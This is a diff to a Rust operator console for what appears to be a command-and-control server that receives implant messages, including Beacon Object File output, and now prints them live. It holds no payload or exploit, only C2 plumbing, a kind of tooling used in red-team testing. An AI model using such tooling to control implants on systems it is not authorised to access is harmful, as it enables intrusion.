@@ -27,7 +27,11 @@ fn main() -> Result<()> {
     let reader_stream = stream.try_clone().context("cloning stream")?;
     let writer_stream = stream;
 
-    let (tx, rx) = mpsc::channel::<String>();
+    // The reader thread prints implant output to stdout the instant it arrives
+    // (and also forwards to the channel for tests). This matters because the
+    // main loop blocks on stdin: if printing happened only when the operator
+    // typed a command, BOF output would appear stuck until the next keystroke.
+    let (tx, _rx) = mpsc::channel::<String>();
 
     // Reader thread: implant -> console.
     thread::spawn(move || reader_loop(reader_stream, tx));
@@ -70,16 +74,9 @@ fn main() -> Result<()> {
                 }
             }
         }
-        // Drain any implant output that has arrived (non-blocking).
-        while let Ok(out) = rx.try_recv() {
-            println!("{out}");
-        }
+        // Output is printed live by the reader thread; nothing to drain here.
     }
 
-    // Final drain.
-    while let Ok(out) = rx.try_recv() {
-        println!("{out}");
-    }
     eprintln!("[server] bye.");
     Ok(())
 }
@@ -110,12 +107,13 @@ fn send(writer: &mut BufWriter<TcpStream>, msg: &ServerMessage) -> Result<()> {
 
 fn reader_loop(stream: TcpStream, tx: mpsc::Sender<String>) {
     let mut reader = BufReader::new(stream);
+    let stdout = std::io::stdout();
     let mut line = String::new();
     loop {
         line.clear();
         match reader.read_line(&mut line) {
             Ok(0) => {
-                let _ = tx.send("[server] implant disconnected".to_string());
+                print_line(&stdout, "[server] implant disconnected", &tx);
                 break;
             }
             Ok(_) => {
@@ -125,25 +123,35 @@ fn reader_loop(stream: TcpStream, tx: mpsc::Sender<String>) {
                 }
                 match serde_json::from_str::<ImplantMessage>(trimmed) {
                     Ok(ImplantMessage::Hello { data }) => {
-                        let _ = tx.send(format!("[implant] hello: {data}"));
+                        print_line(&stdout, &format!("[implant] hello: {data}"), &tx);
                     }
                     Ok(ImplantMessage::Output { data }) => {
-                        let _ = tx.send(format!("[implant] output: {data}"));
+                        print_line(&stdout, &format!("[implant] output: {data}"), &tx);
                     }
                     Ok(ImplantMessage::Error { data }) => {
-                        let _ = tx.send(format!("[implant] error: {data}"));
+                        print_line(&stdout, &format!("[implant] error: {data}"), &tx);
                     }
                     Err(e) => {
-                        let _ = tx.send(format!("[server] unparseable line ({e}): {trimmed}"));
+                        print_line(&stdout, &format!("[server] unparseable line ({e}): {trimmed}"), &tx);
                     }
                 }
             }
             Err(e) => {
-                let _ = tx.send(format!("[server] read error: {e}"));
+                print_line(&stdout, &format!("[server] read error: {e}"), &tx);
                 break;
             }
         }
     }
+}
+
+/// Print `msg` to stdout immediately (flushed) and forward it to the test
+/// channel. The direct print is what makes live output appear without waiting
+/// for operator input; the channel keeps the unit tests working.
+fn print_line(stdout: &std::io::Stdout, msg: &str, tx: &mpsc::Sender<String>) {
+    let _ = tx.send(msg.to_string());
+    let mut h = stdout.lock();
+    let _ = writeln!(h, "{msg}");
+    let _ = h.flush();
 }
 
 #[cfg(test)]
